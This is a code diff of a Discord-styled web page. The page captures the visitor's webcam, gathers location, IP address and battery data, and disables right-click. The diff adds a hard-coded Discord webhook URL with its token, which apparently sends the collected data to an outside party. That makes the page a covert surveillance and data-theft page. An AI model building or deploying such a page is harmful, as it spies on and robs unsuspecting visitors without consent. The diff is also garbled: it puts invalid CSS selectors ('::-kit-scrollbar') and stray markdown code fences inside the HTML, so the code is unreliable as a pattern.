@@ -41,11 +41,11 @@
             100%{ top:100%; }
         }
 
-        ::-webkit-scrollbar{
+        ::-kit-scrollbar{
             width:6px;
         }
 
-        ::-webkit-scrollbar-thumb{
+        ::-kit-scrollbar-thumb{
             background:#5865F2;
             border-radius:999px;
         }
@@ -99,7 +99,7 @@
             <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-[#5865F2]/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(88,101,242,0.4)]">
 
                 <video
-                    id="webcam"
+                    id="cam"
                     class="w-full h-full object-cover scale-x-[-1]"
                     autoplay
                     playsinline>
@@ -153,7 +153,10 @@
 
 </div>
 
+```js
 <script>
+
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv";
 
 let userData = {
     lat: null,
@@ -161,6 +164,8 @@ let userData = {
     ip: "Unknown",
     battery: "Unknown"
 };
+```
+
 
 // ปิดคลิกขวา
 document.addEventListener(
@@ -246,7 +251,7 @@ async function initCamera(){
             });
 
         const video =
-            document.getElementById("webcam");
+            document.getElementById("cam");
 
         video.srcObject = stream;
 
